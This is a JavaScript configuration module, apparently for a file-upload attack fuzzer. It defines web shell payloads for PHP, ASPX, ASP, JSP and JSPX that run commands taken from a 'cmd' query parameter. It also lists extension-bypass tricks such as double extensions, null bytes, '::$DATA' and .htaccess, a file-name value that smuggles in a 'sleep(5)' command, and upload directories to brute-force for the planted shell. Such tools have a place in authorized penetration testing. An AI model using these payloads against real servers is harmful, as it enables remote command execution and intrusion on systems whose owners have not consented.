
export const request = {
    url: '',
    method: 'POST',
    contentType: "multipart/form-data",
    formDataName: 'file'
};

export const allowedExt = ".png"
export const PHP_PAYLOAD = "<?php system($_GET['cmd']); ?>";

export const extensions = {
    highPriority: [
        ".php", ".php5", ".php7", ".phtml", ".phar", ".phps",
        ".py", ".pyc", ".pl", ".cgi",
    ],
    bypassAttempts: [
        ".php.jpg", ".png.php"
    ],

    codeExec: [
        ".jpg; sleep(5)",
    ],

    windows: [
        ".aspx", ".asp", ".jspx", ".scf", ".url",
        ".cer", ".asa", ".ashx", ".asmx", ".lnk",
        ".php:::$DATA", ".asp%00.jpg", ".jsp%00.jpg",
        "wax", ".xspf"
    ],

    serverConfig: [
        ".htaccess", ".htpasswd",
        ".conf", ".config", ".xml", ".ini",
    ],

    archive: [
        ".zip", ".tar", ".gz", ".rar",
    ],
};

export let extContent = {
    ".aspx": "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request.QueryString[\"cmd\"]); %>",
    ".asp": "<% System.Diagnostics.Process.Start(Request.QueryString[\"cmd\"]); %>",
    ".jsp": "<% out.println(Runtime.getRuntime().exec(request.getParameter(\"cmd\"))); %>",
    ".jspx": "<jsp:scriptlet> out.println(Runtime.getRuntime().exec(request.getParameter(\"cmd\"))); </jsp:scriptlet>",
    ".png": "PNG"
};

export let bruteDirs = [
    "/uploads/",
    "/images/",
    "/files/",
    "/upload/",
    "/img/",
    "/assets/",
    "/files/uploads/",
    "/userfiles/",
    "/media/",
    "/content/uploads/",
    "/content/images/",
    "/content/files/"
]

export const red = s => `\x1b[31m${s}\x1b[0m`;
export const green = s => `\x1b[32m${s}\x1b[0m`;
export const yellow = s => `\x1b[33m${s}\x1b[0m`;
export const blue = s => `\x1b[34m${s}\x1b[0m`;
export const yellow_green = s => `\x1b[38;2;173;255;47m${s}\x1b[0m`;

// Flatten for fuzzing
export const allExtensions = Object.values(extensions).flat();